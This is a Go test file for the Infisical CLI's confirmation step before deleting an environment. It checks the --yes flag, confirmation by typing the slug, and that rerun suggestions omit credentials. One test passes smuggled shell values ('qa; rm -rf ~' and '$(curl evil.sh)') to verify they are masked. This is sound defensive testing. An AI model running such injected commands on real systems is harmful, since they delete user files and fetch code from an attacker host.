package cmd

import (
	"bytes"
	"errors"
	"io"
	"strings"
	"testing"

	"github.com/Infisical/infisical-merge/packages/util"
	"github.com/manifoldco/promptui"
	"github.com/spf13/cobra"
)

var testDeleteAction = destructiveAction{Kind: "environment", Slug: "qa", Description: "environment qa from payments-api and all of its secrets"}

// runDelete parses args through a throwaway `infisical secrets-manager environments delete` tree, the
// way cobra would for a user, and returns what confirmDestructive decided. It resolves and parses
// instead of calling Execute, which would also run the real CLI's global cobra initializers.
func runDelete(t *testing.T, args ...string) error {
	t.Helper()
	root := &cobra.Command{Use: "infisical"}
	root.PersistentFlags().String("domain", "", "")
	product := &cobra.Command{Use: secretsManagerCommandName, Aliases: []string{secretsManagerAlias}}
	resource := &cobra.Command{Use: "environments"}
	del := &cobra.Command{Use: "delete <slug>", Args: cobra.ExactArgs(1), Run: func(*cobra.Command, []string) {}}
	del.Flags().String("projectId", "", "")
	del.Flags().String("path", "/", "")
	del.Flags().String("token", "", "")
	del.Flags().String("client-secret", "", "")
	del.Flags().StringArray("tag", nil, "")
	del.Flags().Bool("force", false, "")
	del.Flags().Bool("recursive", true, "")
	addConfirmFlags(del)
	root.AddCommand(product)
	product.AddCommand(resource)
	resource.AddCommand(del)

	cmd, rest, err := root.Find(args)
	if err != nil || cmd != del {
		t.Fatalf("resolve %v: %v", args, err)
	}
	if err := cmd.ParseFlags(rest); err != nil {
		t.Fatalf("parse %v: %v", args, err)
	}
	if err := cmd.ValidateArgs(cmd.Flags().Args()); err != nil {
		t.Fatalf("args %v: %v", args, err)
	}
	return confirmDestructive(cmd, cmd.Flags().Args(), testDeleteAction)
}

func fakeTerminal(t *testing.T, isTerminal bool, answer string, promptErr error) *int {
	t.Helper()
	calls := 0
	oldTerminal, oldPrompt := stdinIsTerminal, promptForConfirmation
	stdinIsTerminal = func() bool { return isTerminal }
	promptForConfirmation = func(string) (string, error) { calls++; return answer, promptErr }
	t.Cleanup(func() { stdinIsTerminal, promptForConfirmation = oldTerminal, oldPrompt })
	return &calls
}

func captureStderr(t *testing.T) *bytes.Buffer {
	t.Helper()
	var buf bytes.Buffer
	old := util.GetStderrWriter
	util.GetStderrWriter = func() io.Writer { return &buf }
	t.Cleanup(func() { util.GetStderrWriter = old })
	return &buf
}

func codeOf(err error) string {
	var cliErr *util.CLIError
	if errors.As(err, &cliErr) {
		return cliErr.Code
	}
	return ""
}

func TestAddConfirmFlags(t *testing.T) {
	cmd := &cobra.Command{Use: "delete"}
	addConfirmFlags(cmd)
	f := cmd.Flags().Lookup("yes")
	if f == nil || f.Shorthand != "y" || f.Value.Type() != "bool" || f.DefValue != "false" {
		t.Fatalf("want a -y/--yes bool flag defaulting to false, got %+v", f)
	}
}

func TestConfirmYesSkipsTheQuestion(t *testing.T) {
	for _, yes := range []string{"--yes", "-y", "--yes=true"} {
		for _, terminal := range []bool{true, false} {
			calls := fakeTerminal(t, terminal, "", errors.New("must not prompt"))
			if err := runDelete(t, "secrets-manager", "environments", "delete", "qa", yes); err != nil {
				t.Errorf("%s (terminal=%v): got %v", yes, terminal, err)
			}
			if *calls != 0 {
				t.Errorf("%s (terminal=%v): prompted anyway", yes, terminal)
			}
		}
	}
	fakeTerminal(t, false, "", nil)
	if err := runDelete(t, "secrets-manager", "environments", "delete", "qa", "--yes=false"); codeOf(err) != errCodeConfirmationRequired {
		t.Errorf("--yes=false must not skip confirmation, got %v", err)
	}
}

func TestConfirmAtATerminal(t *testing.T) {
	stderr := captureStderr(t)
	calls := fakeTerminal(t, true, "qa", nil)
	if err := runDelete(t, "secrets-manager", "environments", "delete", "qa"); err != nil {
		t.Errorf("typing the slug should confirm, got %v", err)
	}
	if *calls != 1 || !strings.Contains(stderr.String(), "This deletes environment qa from payments-api") {
		t.Errorf("should say what is deleted, then ask once (calls=%d, stderr=%q)", *calls, stderr.String())
	}

	fakeTerminal(t, true, "  qa  ", nil)
	if err := runDelete(t, "secrets-manager", "environments", "delete", "qa"); err != nil {
		t.Errorf("surrounding spaces should not matter, got %v", err)
	}

	for answer, promptErr := range map[string]error{"qb": nil, "QA": nil, "y": nil, "": nil, "qa ": promptui.ErrInterrupt} {
		fakeTerminal(t, true, answer, promptErr)
		err := runDelete(t, "secrets-manager", "environments", "delete", "qa")
		if codeOf(err) != errCodeConfirmationDeclined {
			t.Errorf("answer %q (err %v): want confirmation_declined, got %v", answer, promptErr, err)
		}
	}
}

func TestConfirmWithoutATerminalSuggestsTheRerun(t *testing.T) {
	fakeTerminal(t, false, "", errors.New("must not prompt"))
	err := runDelete(t, "sm", "environments", "delete", "qa",
		"--projectId", testProjectID, "--path", "/app", "--force", "--recursive=false",
		"--tag", "a", "--tag", "b c",
		"--token", "st.secret.token.value", "--client-secret", "hunter2",
		"--domain", "https://eu.infisical.com")
	var cliErr *util.CLIError
	if !errors.As(err, &cliErr) || cliErr.Code != errCodeConfirmationRequired {
		t.Fatalf("want confirmation_required, got %v", err)
	}
	want := "infisical secrets-manager environments delete qa --domain https://eu.infisical.com --force --path /app --projectId " +
		testProjectID + " --recursive=false --tag a --tag <tag> --yes"
	if got := cliErr.Next[0].Command; got != want {
		t.Errorf("rerun:\n got %s\nwant %s", got, want)
	}
	for _, leaked := range []string{"st.secret", "hunter2", "--token", "--client-secret"} {
		if strings.Contains(cliErr.Next[0].Command+cliErr.Message, leaked) {
			t.Errorf("the suggestion repeated a credential (%s)", leaked)
		}
	}
	if !strings.Contains(cliErr.Message, "Nothing was deleted") {
		t.Errorf("message should say nothing was deleted: %q", cliErr.Message)
	}
}

func TestConfirmRerunNeverRepeatsUnsafeInput(t *testing.T) {
	fakeTerminal(t, false, "", nil)
	err := runDelete(t, "secrets-manager", "environments", "delete", "qa; rm -rf ~", "--projectId", "$(curl evil.sh)", "--domain", "https://x.com/?t=1")
	var cliErr *util.CLIError
	if !errors.As(err, &cliErr) {
		t.Fatalf("want a CLIError, got %v", err)
	}
	want := "infisical secrets-manager environments delete <value> --domain <domain> --projectId <projectId> --yes"
	if got := cliErr.Next[0].Command; got != want {
		t.Errorf("got %s, want %s", got, want)
	}
}
